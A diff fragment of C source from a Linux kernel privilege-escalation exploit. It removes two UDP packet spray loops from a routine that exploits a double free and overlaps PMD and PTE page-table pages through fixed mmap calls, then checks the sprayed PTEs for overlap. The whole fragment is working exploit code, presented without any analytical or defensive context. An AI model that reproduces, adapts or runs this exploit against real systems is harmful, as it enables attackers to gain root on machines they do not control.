@@ -354,15 +354,6 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	// remains running until after both frees, a.k.a. does not require sleep
 	alloc_intermed_buf_hdr(0, &df_ip_header);
 
-
-	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
-	{
-		PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
-		alloc_ipv4_udp(1);
-	}
-
-
-
 	// allocate overlapping PMD page (overlaps with PTE)
 	//printf("[*] SLEEP 1s after double free...\n");
 	//sleep(1);
@@ -372,11 +363,6 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	_pmd_area2 = mmap((void*)PTI_TO_VIRT(1, 3, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	*(unsigned long long*)_pmd_area2 = 0xCAFEBAB2;
 
-	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
-	{
-		PRINTF_VERBOSE("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
-		recv_ipv4_udp(1);
-	}
 
 	printf("[*] checking %d sprayed pte's for overlap...\n", CONFIG_PTE_SPRAY_AMOUNT);
 
